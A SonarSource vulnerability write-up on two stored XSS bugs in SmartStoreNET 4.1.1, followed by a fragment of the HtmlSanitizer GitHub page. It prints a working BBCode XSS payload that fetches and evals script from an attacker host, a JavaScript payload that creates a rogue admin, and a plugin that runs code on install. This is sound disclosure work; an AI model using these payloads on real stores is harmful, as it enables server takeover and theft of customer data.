=== Content from blog.sonarsource.com_f7312d7a_20250114_212916.html ===
NEW![Sonar has entered a definitive agreement to acquire Tidelift! Read the press release.](/company/press-releases/sonar-to-acquire-tidelift/) [![](data:image/svg+xml;charset=utf-8...)![sonar logo ](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/8e59bcad-6e39-41dc-abd9-a0e251e8d63f/Sonar%20%282%29.svg?w=128&h=32&auto=format&fit=clip)![sonar logo ](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/8e59bcad-6e39-41dc-abd9-a0e251e8d63f/Sonar%20%282%29.svg?w=128&h=32&auto=format&fit=clip)](/ "Home")

* Solutions

  Use Cases

  [AI-assisted & quality-assured codeEnsure code generated by AI assistants is of the highest quality](/solutions/ai/)[DevOps transformationHarness the full potential of DevOps by reducing roll backs and improving quality of releases](/solutions/devops-transformation/)[Code coverageEnsure code quality and security by facilitating faster debugging through clear visibility of coverage gaps.](/solutions/code-coverage/) [Reduce & manage technical debtMaximize innovation by proactively managing technical debt](/solutions/reduce-technical-debt/)[Secure by designIntegrate code security in compliance with NIST Secure Software Development Framework](/solutions/secure-by-design-code/)[All Use CasesRead more about Sonar Use cases with blog articles, technical articles and developer guides](/solutions/use-cases/)

  Clean Code

  [What is clean codeA detailed definition of Clean Code](/solutions/clean-code/)[Power of clean codeBusiness success built on Clean Code](/solutions/power-of-clean-code/)[Security starts with Clean CodeStatic Application Security Testing with Sonar](/solutions/security/)[Clean as You CodeOur unique approach to Clean Code](/solutions/our-unique-approach/)

  Something For Everyone

  [For DevelopersFind and fix issues as you code](/solutions/for-developers/)[For DevOpsBuild your apps on Clean Code foundations](/solutions/infrastructure-as-code/)[For EnterpriseClean Code delivery from development to production](/solutions/for-enterprise/)[For the Public SectorClean Code for the public sector](/solutions/public-sector/)
* Products

  Industry Leading Products

  [![]()![](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/aa3b1f02-f1b0-448f-a3f2-a1bd32923a08/SQ_Logo_Cloud_Light%20Backgrounds.svg?w=176&h=48&auto=format&fit=crop)Formerly SonarCloudCloud-based static analysis tool for your CI/CD workflows](/products/sonarcloud/)[![]()![](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/bdac1871-464e-4051-88db-7df20c3bfffa/SQ_Logo_Server_Light%20Backgrounds.svg?w=176&h=48&auto=format&fit=crop)Formerly SonarQubeSelf-managed static analysis tool for continuous codebase inspection](/products/sonarqube/)[![]()![](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/49f23af2-a29b-4d0f-95d7-ffd361f375e1/SQ_Logo_IDE_Light%20Backgrounds.svg?w=176&h=48&auto=format&fit=crop)Formerly SonarLintFree IDE extension that provides on-the-fly analysis and coding guidance](/products/sonarlint/)

  Languages and Frameworks

  [Java](/knowledge/languages/java/)[JavaScript](/knowledge/languages/js/)[TypeScript](/knowledge/languages/ts/)[Python](/knowledge/languages/python/)[C#](/knowledge/languages/csharp/)[C++](/knowledge/languages/cpp/)[C](/knowledge/languages/c/)[PHP](/knowledge/languages/php/)[Kotlin](/knowledge/languages/kotlin/)[See All](/lp/knowledge/languages/)
* Resources

  Learn About Clean Code

  [BlogStay connected with our latest development news and articles](/blog/)[Events hubLet's meet up online or in person - browse our conferences and webinars, or watch previous talks](/resources/events/)[Customer StoriesCheck out Sonar implementation success stories](/resources/customer-stories/)[White PapersFind in-depth articles on clean code](/resources/white-papers/)[LearnDeveloper learning hub - covering essential topics](/learn/)[Solution BriefsOur library of solution briefs](/resources/solution-briefs/)

  Go In Depth

  [SonarQube Server DocumentationFind more information on the technical details of SonarQube Server](https://docs.sonarsource.com/sonarqube/latest/)[SonarQube Cloud DocumentationFind more information on the technical details of SonarQube Cloud](https://docs.sonarsource.com/sonarcloud/)[SonarQube for IDE DocumentationFind more information on the technical details of SonarQube IDE](https://docs.sonarsource.com/sonarlint/)[Explore SonarpediaExplore our publicly available multi-language rules database](https://rules.sonarsource.com/)[LanguagesSee our multi-language coverage](/knowledge/languages/)
* Company

  Deliver Better Software

  [About UsSonar’s industry leading solution enables developers to write clean code and remediate existing code organically](/company/about/)[CareersJoin our growing team](/company/careers/)[Commitment to open sourceOur commitment to transparency, security, and continuous improvement](/solutions/commitment-to-open-source/)[CommunityGet latest updates, suggest features, and share your knowledge](https://community.sonarsource.com/)[PartnersSonar partners with the best resellers to bring Clean Code closer to you](/company/partners/)[Contact usHave questions? Get in touch](/company/contact/)

  Media

  [NewsroomNews announcements, media coverage, and more](/company/newsroom/)[CoverageFind articles about Sonar in the news](/company/coverage/)[Press ReleasesThe latest Sonar updates](/company/press-releases/)[CustomersAn overview of customers using Sonar by industry](/company/customers/)[Press KitExecutive headshots, quick stats, customer logos, and more](/company/press-kit/)
[Start for free](/open-source-editions/)[Explore pricing](/plans-and-pricing/)
Search modal toggle button[Start for free](/open-source-editions/)[Explore pricing](/plans-and-pricing/)Mobile menu toggle button

Blog post

# SmartStoreNET - Malicious Message leading to E-Commerce Takeover

![](data:image/svg+xml;charset=utf-8...)![Thomas Chauchefoin photo]()![Thomas Chauchefoin photo](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/ddfcf9fd-16c2-4f57-8922-4198a01b5c2a/b0f43e1e-d67e-4bcf-a90c-0a1908c2b772_Thomas_Chauchefoin.jpg?w=800&h=800&auto=format&fit=crop)

Thomas Chauchefoin

Vulnerability Researcher

November 2, 2021

Date

* [Security](/blog/tag/security/)
![](data:image/svg+xml;charset=utf-8...)![Check out the details of a Cross-Site Scripting bug in the BBCode processing in SmartStoreNET and how it can be chained into arbitrary code execution!](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/9a79bf55-8675-4306-a558-9ba715c8943d/cover-8ebeac1c-c71e-46c7-862f-4df86651fc5e_RD-37%2BsmartstoreNET%2BXSS%25402x.png?w=2400&h=1256&auto=format&fit=crop)![Check out the details of a Cross-Site Scripting bug in the BBCode processing in SmartStoreNET and how it can be chained into arbitrary code execution!](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/9a79bf55-8675-4306-a558-9ba715c8943d/cover-8ebeac1c-c71e-46c7-862f-4df86651fc5e_RD-37%2BsmartstoreNET%2BXSS%25402x.png?w=2400&h=1256&auto=format&fit=crop)

SmartStoreNET is the leading open-source e-commerce platform for .NET, which makes it suitable for companies running Windows Server. Next to the operation of an online business, it offers advanced features, such as CRM tools, a blog and a forum. As a result, a SmartStoreNET instance handles highly sensitive data such as credit card, financial and personally identifiable information that have to be protected from attackers.

During recent security research, we discovered two vulnerabilities that could allow attackers to gain control of the server where SmartStoreNET is installed by sending one malicious message to the instance's administrator. In this article, we present the root cause analysis of two Cross-Site Scripting bugs, and then describe how they could be exploited by attackers. Finally, we will describe the patches applied by the maintainers and the limitations of those patches.

## Impact

Our findings, CVE-2021-32607 and CVE-2021-32608, impact the latest release of SmartStoreNET, 4.1.1. The maintainers released security patches as commits on GitHub. However, they decided not to release a new version with the patches; you have to build the project yourself to secure your instance. These are Cross-Site Scripting vulnerabilities that allow attackers to perform actions with the victim’s set of privileges without their knowledge. A successful attack against an administrator can lead to the compromise of the e-commerce store and the interception of financial transactions and personal data.

Their exploitation requires a victim to read either a malicious forum post or private message, specially crafted by the attacker. The following video shows all the necessary steps—note that the attack could be fully automated and the manual actions you see in the video are there to make it easier to understand:

## Technical details

In this section, we describe both the root cause of the Cross-Site Scripting vulnerabilities we identified, and how they can be leveraged to gain Arbitrary Code Execution by targeting an administrator.

The high-level idea behind these bugs is that developers correctly sanitize user-controlled data, but later apply further processing steps, thus voiding the security guarantees of the first sanitization pass, with potentially dangerous results. Simon Scannell, a member of the SonarSource R&D team, [presented this code pattern at Hacktivity 2021.](https://hacktivity.com/index.php/presentations/ "presented this code pattern at Hacktivity 2021.")

### Stored Cross-Site Scripting (CVE-2021-32607, CVE-2021-32608)

SmartStore comes with a public forum where all registered members can exchange posts and private messages. In these texts, users can use basic BBcode markup to add limited styling to their messages. The BBcode is translated by `SmartStore.Core.Html.BBCodeHelper` (`src/Libraries/SmartStore.Core/Html/BBCodeHelper.cs`) using regular expressions. For instance, this helper is called in `SmartStore.Services.Forums.ForumExtensions` (`src/Libraries/SmartStore.Services/Forums/ForumExtensions.cs`), after processing a user message:

```
public static string FormatPrivateMessageText(this PrivateMessage message)
{
   // [...]
   var text = message.Text;
   // [...]
   text = HtmlUtils.ConvertPlainTextToHtml(text.HtmlEncode());
   return BBCodeHelper.ToHtml(text);
}
```

The call to `HtmlEncode()` is only a wrapper around `System.Web.HttpUtility.HtmlEncode()`. The intent is to encode dangerous characters to their equivalent HTML entities to prevent parts of user messages from being interpreted as HTML tags. For example, `<` will be encoded as `&lt`;.   `HtmlUtils.ConvertPlainTextToHtml()` is not tasked with any security-sensitive operations; it only replaces spaces and new lines to keep formatting intact.

Notice  that during the BBCode processing, the tags with arguments (`[url=...][/url]`, at `[1]`) will be processed before the ones without arguments (`[url][/url]`, at `[2]`):

```
private static readonly Regex regexUrl1 = new Regex(@"\[url\=([^\]]+)\]([^\]]+)\[/url\]", RegexOptions.Compiled | RegexOptions.IgnoreCase);
private static readonly Regex regexUrl2 = new Regex(@"\[url\](.+?)\[/url\]", RegexOptions.Compiled | RegexOptions.IgnoreCase);
// [...]
if (replaceUrl)
{
   // format the url tags: [url=http://www.smartstore.com]my site[/url]
   // becomes: <a href="http://www.smartstore.com">my site</a>
   text = regexUrl1.Replace(text, "<a href=\"$1\" rel=\"nofollow\">$2</a>"); // [1]

   // format the url tags: [url]http://www.smartstore.com[/url]
   // becomes: <a href="http://www.smartstore.com">http://www.smartstore.com</a>
   text = regexUrl2.Replace(text, "<a href=\"$1\" rel=\"nofollow\">$1</a>"); // [2]
}
```

While users can’t use quotes to escape the `href` attribute because of prior encoding steps, using an URL tag with arguments *within* an URL tag without arguments will have an unexpected result. The following drawing shows the transformation of a message containing tangled `[url]` BBCode tags:

![](data:image/svg+xml;charset=utf-8...)![User-controlled data goes through several stages of processing.]()![User-controlled data goes through several stages of processing.](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/e355d5e0-8655-4eb1-a022-e18ed3aaf0bd/body-e83fe7b8-c1c4-463b-9aa8-77f0953b54f2_RD-37%2Bsmartstore%2Bcode%25402x.png?w=2400&h=1256&auto=format&fit=crop)

When applying the second replacement, the non-encoded quotes created by the first step will close the `href` attribute of the second regex pass. Once processed by the browser, the final DOM will look like this—notice the presence of new, user-controlled attributes in the first `<a>` tag:

![](data:image/svg+xml;charset=utf-8...)![DOM vizualisation. ]()![DOM vizualisation. ](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/51a73016-5f4d-467f-810e-1d2bc7ca9584/body-8479faf2-8691-49e4-99ad-f7db7adf0374_Capture%2Bd%25E2%2580%2599e%25CC%2581cran%2B2021-10-26%2Ba%25CC%2580%2B16.35.17.png?w=1860&h=262&auto=format&fit=crop)

This behavior is enough to add arbitrary attributes to the first `<a>` tag, leading to persistent Cross-Site Scripting through forum posts and private messages. This bug is a perfect example of the sanitize-then-transform pattern and is very similar to other bugs we discussed in our previous articles ([Zimbra 8.8.15 - Webmail Compromise via Email](https://blog.sonarsource.com/zimbra-webmail-compromise-via-email "Zimbra 8.8.15 - Webmail Compromise via Email"), [MyBB Remote Code Execution Chain](https://blog.sonarsource.com/mybb-remote-code-execution-chain "MyBB Remote Code Execution Chain ")).

### Crafting a Code Execution chain

Cross-Site Scripting vulnerabilities are very powerful, because they allow attackers to perform actions with the victim’s set of privileges. The persistent nature of these bugs makes it easier for the attacker to compel the victim's interaction: who wouldn’t read a private message on a platform they administer?

We chose to demonstrate the potential impact of our findings by crafting a payload that would force the creation of a new administrator, as soon as the victim opens a private message and without further interaction. This malicious new user will then be able to use the plugins page to upload a malicious NuGet package (`*.nupkg`) on the server to execute arbitrary code.

The vulnerable BBCode parsing is performed on both private messages and forum posts. The following sections will focus on a scenario where only private messages are mentioned, but the exploitation process is similar for both.

#### Creating the Cross-Site Scripting payload

As previously demonstrated, we are limited to adding new attributes to an `<a>` tag and can’t create new ones because of the various encoding stages. This limit on the usable character set will also require a *stager*: a deliberately small payload that will fetch and execute a larger one.

So, how can we make this payload fire as soon as the private message is rendered? We chose to use the fact that several CSS animations are implemented in the third-party library Font Awesome, which is already loaded by SmartStoreNET. By associating an animation to the `<a>` element we injected and creating an `onwebkitanimationend` attribute, it will be executed without user interaction.

The final payload you can see in the video is the following:

```
[url] [url=style=animation-name:fa-spin; onwebkitanimationend=$.get(`http://attacker.tld/x.js`,function(_){eval(_)}) x=] [/url] [/url]
```

Then, automatically creating an administrator is a pure front-end development task: the attacker only needs to fetch the CSRF token and then perform the POST request to the endpoint `/admin/customer/create`:

```
async function run()
{
   const customer_create_url = location.protocol + '//host.tld/admin/customer/create';
   let res = await fetch(customer_create_url, {credentials: 'include'});
   var parser = new DOMParser();
   var htmlDoc = parser.parseFromString(await res.text(), 'text/html');
   let csrf = htmlDoc.getElementsByName('__RequestVerificationToken');
   data = {
       save: 'save',
       __RequestVerificationToken: csrf[0].attributes.value.nodeValue,
       Id: 0,
       Username: 'evil_admin',
       Email: 'evil_admin@evil.tld',
       Password: 'evil_admin',
       Gender: 'M',
       FirstName: 'evil',
       LastName: 'evil',
       DateOfBirth: '5/1/2021',
       Company: 'evil',
       AdminComment: 'evil',
       SelectedCustomerRoleIds: 1,
       IsTaxExempt: false,
       Active: true,
       LoadedTabs: '#customer-edit-1'
   }
   let body = new URLSearchParams();
   Object.keys(data).map(k => body.append(k, data[k]));
   body.append('SelectedCustomerRoleIds', 3);
   let foo = await fetch(customer_create_url, {method: 'POST', body: body, credentials: 'include'});
}

run()
```

This payload can be hosted anywhere, as long the right CORS headers are present in the response.

#### Executing arbitrary code

SmartStoreNET can be extended with both official and third-party plugins. There is no “official” store for them, and no mandatory code signing: users can craft malicious packages and upload them directly from the administration dashboard.

![](data:image/svg+xml;charset=utf-8...)![SmartStoreNET's plugin interface. ]()![SmartStoreNET's plugin interface. ](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/a265e4d8-3eec-43d8-adae-acfaf8146746/body-3569aa58-74c3-4dd5-9865-5a81cf0e840f_Capture%2Bd%25E2%2580%2599e%25CC%2581cran%2B2021-10-05%2Ba%25CC%2580%2B16.09.51.png?w=3806&h=1554&auto=format&fit=crop)

In order to validate this idea and to try to emulate what attackers could realistically do, we crafted a SmartStoreNET plugin that would execute the command `calc.exe` during the install process. We then compiled it with the right .NET target and packaged it with SmartStoreNET’s tools.

```
using SmartStore.Core.Plugins;
// [...]
namespace SmartStore.Evil
{
   public class Evil : BasePlugin
   {
       // [...]
       public static string SystemName => "SmartStore.Evil";
       // [...]
       public override void Install()
       {
           System.Diagnostics.Process p = System.Diagnostics.Process.Start("calc.exe");
           p.WaitForInputIdle();
           base.Install();
       }
       // [...]
   }
}
```

As demonstrated at the end of the video, this grants attackers arbitrary code execution with the privileges of the user running IIS.

### Patch

SmartStoreNET mitigated the two vulnerabilities by introducing a new round of sanitization at the very end of the processing chain. It is performed by the third-party library [mganss/HtmlSanitizer](https://github.com/mganss/HtmlSanitizer/ "mganss/HtmlSanitizer").

* CVE-2021-32607: the `Message` attribute of private messages is now sanitized ([3db1fae3](https://github.com/smartstore/SmartStoreNET/commit/5b4e60ae7124df0898975cb8f994f9f23db1fae3 "3db1fae3"))

```
--- a/src/Presentation/SmartStore.Web/Views/PrivateMessages/View.cshtml
+++ b/src/Presentation/SmartStore.Web/Views/PrivateMessages/View.cshtml
@@ -1,5 +1,6 @@
@model PrivateMessageModel
@using SmartStore.Web.Models.PrivateMessages;
+@using SmartStore.Core.Html;
@{
    Layout = "_Layout";
    Html.AddTitleParts(T("PageTitle.ViewPM").Text);
@@ -28,7 +29,7 @@
            <div class="col-sm-9">
                <div class="card">
                    <div class="card-body" dir="auto">
-                        @Html.Raw(Model.Message)
+                        @Html.Raw(HtmlUtils.SanitizeHtml(Model.Message, true))
                    </div>
                </div>
            </div>
```

* CVE-2021-32608: the `FormattedText` attribute of forum posts is now sanitized ([e076c20f](https://github.com/smartstore/SmartStoreNET/commit/ae03d45e23734555a2aef0b0c3d33c21e076c20f "e076c20f"))

```
--- a/src/Presentation/SmartStore.Web/Views/Boards/Partials/_ForumPost.cshtml
+++ b/src/Presentation/SmartStore.Web/Views/Boards/Partials/_ForumPost.cshtml
@@ -1,4 +1,6 @@
@using SmartStore.Web.Models.Boards;
+@using SmartStore.Core.Html;
+
@model ForumPostModel
@Html.Raw("<a name=\"{0}\"></a>".FormatInvariant(Model.Id))
[...]
            <div class="post-body">
                <div class="posttext" dir="auto">
-                    @Html.Raw(Model.FormattedText)
+                    @Html.Raw(HtmlUtils.SanitizeHtml(Model.FormattedText))
                </div>
                @Html.Hidden("Id", Model.Id)
            </div>
```

It is interesting to note that the dangerous sanitize-then-transform pattern is still used. We were not able to identify other features that would be vulnerable, but future changes could easily re-introduce similar bugs.

## Timeline

| **Date** | **Action** |
| --- | --- |
| 2021-05-11 | We report both bugs to the vendor. |
| 2021-05-12 | The vendor confirms the bugs, and releases patches on GitHub. |
| 2021-08-21 | The vendor states that they do not plan to release a new version that would include fixes for our findings for now. |

## Summary

In this article, we described two Cross-Site Scripting bugs in SmartStoreNET 4.1.1 and how they could be turned into the execution of arbitrary code if an administrative user is targeted. We also explained how to exploit such bugs without user interaction by using code already loaded in the application. Finally, we described the mitigations implemented by the maintainers and their limitations.

We would like to thank the SmartStoreNET maintainers for their cooperation and very quick fixes. Since the vendor told us there is no planned release, we strongly advise administrators to build it from the source to benefit from the latest security fixes.

## Related Blog Posts

* [Zimbra 8.8.15 - Webmail Compromise via Email](https://blog.sonarsource.com/zimbra-webmail-compromise-via-email "Zimbra 8.8.15 - Webmail Compromise via Email ")
* [MyBB Remote Code Execution Chain](https://blog.sonarsource.com/mybb-remote-code-execution-chain "MyBB Remote Code Execution Chain ")
#### SHARE

[twitter](https://twitter.com/share?text=undefined)[facebook](https://www.facebook.com/sharer/sharer.php?u=undefined)[linkedin](https://www.linkedin.com/sharing/share-offsite/?url=undefined)mail[Go to SonarSource homepage![](data:image/svg+xml;charset=utf-8...)![sonar logo ]()![sonar logo ](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/8e59bcad-6e39-41dc-abd9-a0e251e8d63f/Sonar%20%282%29.svg?w=160&h=40&auto=format&fit=crop)](/)

* **Sonar Solutions**
  + [SAST](/solutions/security/)
  + [What is clean code](/solutions/clean-code/)
  + [Power of clean code](/solutions/power-of-clean-code/)
  + [Clean as you code](/solutions/our-unique-approach/)
  + [AI-assisted & quality-assured code](/solutions/ai/)
  + [DevOps transformation](/solutions/devops-transformation/)
  + [Outsourcing software development](/solutions/reduce-outsourcing-software-development-risk/)
  + [Reduce & manage technical debt](/solutions/reduce-technical-debt/)
  + [Secure by design](/solutions/secure-by-design-code/)
  + [Code coverage](/solutions/code-coverage/)
  + [Code review](/solutions/code-review/)
  + [For developers](/solutions/for-developers/)
  + [For enterprise](/solutions/for-enterprise/)
  + [Infrastructure as code](/solutions/infrastructure-as-code/)
  + [Public sector](/solutions/public-sector/)
* **Products**
  + [SonarQube for IDE](/products/sonarlint/)
  + [SonarQube Server](/products/sonarqube/)
  + [SonarQube Cloud](/products/sonarcloud/)**Pricing**
  + [Start for free](/open-source-editions/)
  + [Explore pricing](/plans-and-pricing/)
* **Company**
  + [About](/company/about/)
  + [Careers](/company/careers/)
  + [Commitment to open source](/solutions/commitment-to-open-source/)
  + [Customers](/company/customers/)
  + [Partners](/company/partners/)
  + [Contact us](/company/contact/)
  + [Accessibility](/accessibility/)
  + [NEW! Brand identity](/brand-identity/)**Media**
  + [Coverage](/company/coverage/)
  + [Press releases](/company/press-releases/)
* **Resources**
  + [Events hub](/resources/events/)
  + [Customer stories](/resources/customer-stories/)
  + [White papers](/resources/white-papers/)
  + [Learn](/learn/guide/)
  + [Community](https://community.sonarsource.com/)
  + [Support](/support/)
* **Knowledge**
  + [Explore Sonarpedia](https://rules.sonarsource.com/)
  + [Blog](/blog/)
  + [Languages](/knowledge/languages/)
  + [SonarQube Server Documentation](https://docs.sonarsource.com/sonarqube/latest/)
  + [SonarQube Cloud Documentation](https://docs.sonarsource.com/sonarcloud/)
  + [SonarQube for IDE Documentation](https://docs.sonarsource.com/sonarlint/)

* [Legal documentation](/legal/)
* [Trust center](/trust-center/)

* [Follow SonarSource on Twitter](https://twitter.com/sonarsource)
* [Follow SonarSource on Linkedin](https://www.linkedin.com/company/sonarsource/)

© 2008-2025 SonarSource SA. All rights reserved. SONAR, SONARSOURCE, SONARQUBE, and CLEAN AS YOU CODE are trademarks of SonarSource SA.



=== Content from github.com_d517bbb1_20250115_190924.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmganss%2FHtmlSanitizer%2F)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmganss%2FHtmlSanitizer%2F)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=mganss%2FHtmlSanitizer)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mganss](/mganss)
/
**[HtmlSanitizer](/mganss/HtmlSanitizer)**
Public

* [Notifications](/login?return_to=%2Fmganss%2FHtmlSanitizer) You must be signed in to change notification settings
* [Fork
  205](/login?return_to=%2Fmganss%2FHtmlSanitizer)
* [Star
   1.6k](/login?return_to=%2Fmganss%2FHtmlSanitizer)

Cleans HTML to avoid XSS attacks

### License

[MIT license](/mganss/HtmlSanitizer/blob/master/LICENSE.md)

[1.6k
stars](/mganss/HtmlSanitizer/stargazers) [205
forks](/mganss/HtmlSanitizer/forks) [Branches](/mganss/HtmlSanitizer/branches) [Tags](/mganss/HtmlSanitizer/tags) [Activity](/mganss/HtmlSanitizer/activity)
 [Star](/login?return_to=%2Fmganss%2FHtmlSanitizer)

 [Notifications](/login?return_to=%2Fmganss%2FHtmlSanitizer) You must be signed in to change notification settings

* [Code](/mganss/HtmlSanitizer)
* [Issues
  17](/mganss/HtmlSanitizer/issues)
* [Pull requests
  1](/mganss/HtmlSanitizer/pulls)
* [Discussions](/mganss/HtmlSanitizer/discussions)
* [Actions](/mganss/HtmlSanitizer/actions)
* [Projects
  0](/mganss/HtmlSanitizer/projects)
* [Wiki](/mganss/HtmlSanitizer/wiki)
* [Security](/mganss/HtmlSanitizer/security)
* [Insights](/mganss/HtmlSanitizer/pulse)

Additional navigation options

* [Code](/mganss/HtmlSanitizer)
* [Issues](/mganss/HtmlSanitizer/issues)
* [Pull requests](/mganss/HtmlSanitizer/pulls)
* [Discussions](/mganss/HtmlSanitizer/discussions)
* [Actions](/mganss/HtmlSanitizer/actions)
* [Projects](/mganss/HtmlSanitizer/projects)
* [Wiki](/mganss/HtmlSanitizer/wiki)
* [Security](/mganss/HtmlSanitizer/security)
* [Insights](/mganss/HtmlSanitizer/pulse)

# mganss/HtmlSanitizer

    master[Branches](/mganss/HtmlSanitizer/branches)[Tags](/mganss/HtmlSanitizer/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[752 Commits](/mganss/HtmlSanitizer/commits/master/) | | |
| [.github](/mganss/HtmlSanitizer/tree/master/.github ".github") | | [.github](/mganss/HtmlSanitizer/tree/master/.github ".github") |  |  |
| [src/HtmlSanitizer](/mganss/HtmlSanitizer/tree/master/src/HtmlSanitizer "This path skips through empty directories") | | [src/HtmlSanitizer](/mganss/HtmlSanitizer/tree/master/src/HtmlSanitizer "This path skips through empty directories") |  |  |
| [test](/mganss/HtmlSanitizer/tree/master/test "test") | | [test](/mganss/HtmlSanitizer/tree/master/test "test") |  |  |
| [.gitattributes](/mganss/HtmlSanitizer/blob/master/.gitattributes ".gitattributes") | | [.gitattributes](/mganss/HtmlSanitizer/blob/master/.gitattributes ".gitattributes") |  |  |
| [.gitignore](/mganss/HtmlSanitizer/blob/master/.gitignore ".gitignore") | | [.gitignore](/mganss/HtmlSanitizer/blob/master/.gitignore ".gitignore") |  |  |
| [HtmlSanitizer.sln](/mganss/HtmlSanitizer/blob/master/HtmlSanitizer.sln "HtmlSanitizer.sln") | | [HtmlSanitizer.sln](/mganss/HtmlSanitizer/blob/master/HtmlSanitizer.sln "HtmlSanitizer.sln") |  |  |
| [LICENSE.md](/mganss/HtmlSanitizer/blob/master/LICENSE.md "LICENSE.md") | | [LICENSE.md](/mganss/HtmlSanitizer/blob/master/LICENSE.md "LICENSE.md") |  |  |
| [README.md](/mganss/HtmlSanitizer/blob/master/README.md "README.md") | | [README.md](/mganss/HtmlSanitizer/blob/master/README.md "README.md") |  |  |
| [appveyor.yml](/mganss/HtmlSanitizer/blob/master/appveyor.yml "appveyor.yml") | | [appveyor.yml](/mganss/HtmlSanitizer/blob/master/appveyor.yml "appveyor.yml") |  |  |
| View all files | | |

## Repository files navigation

* README
* MIT license
# HtmlSanitizer

[![NuGet version](https://camo.githubusercontent.com/22d837dd8a4600deefe8ad1493c03b1d0e4ee137a004828ba18772c91660ada8/68747470733a2f2f62616467652e667572792e696f2f6e752f48746d6c53616e6974697a65722e737667)](https://badge.fury.io/nu/HtmlSanitizer)
[![Build status](https://camo.githubusercontent.com/a93c307744223163954fcc6f0022ec9a7b0a7ef2251a2405d418649604f43629/68747470733a2f2f63692e6170707665796f722e636f6d2f6170692f70726f6a656374732f7374617475732f343138626d66783634336961653030632f6272616e63682f6d61737465723f7376673d74727565)](https://ci.appveyor.com/project/mganss/htmlsanitizer/branch/master)
[![codecov.io](https://camo.githubusercontent.com/14dc91b81d6d8d742f6e283a3697cbf8b7c0b35427236b3d1205473bb94ffea3/68747470733a2f2f636f6465636f762e696f2f6769746875622f6d67616e73732f48746d6c53616e6974697a65722f636f7665726167652e7376673f6272616e63683d6d6173746572)](https://codecov.io/github/mganss/HtmlSanitizer?branch=master)
[![Sonarcloud Quality Gate](https://camo.githubusercontent.com/de5a8efc780fc843499518276aad7ca7b8d2067262f6aca61d6986af55cffb8b/68747470733a2f2f736f6e6172636c6f75642e696f2f6170692f70726f6a6563745f6261646765732f6d6561737572653f70726f6a6563743d6d67616e73735f48746d6c53616e6974697a6572266d65747269633d616c6572745f737461747573)](https://sonarcloud.io/dashboard?id=mganss_HtmlSanitizer)

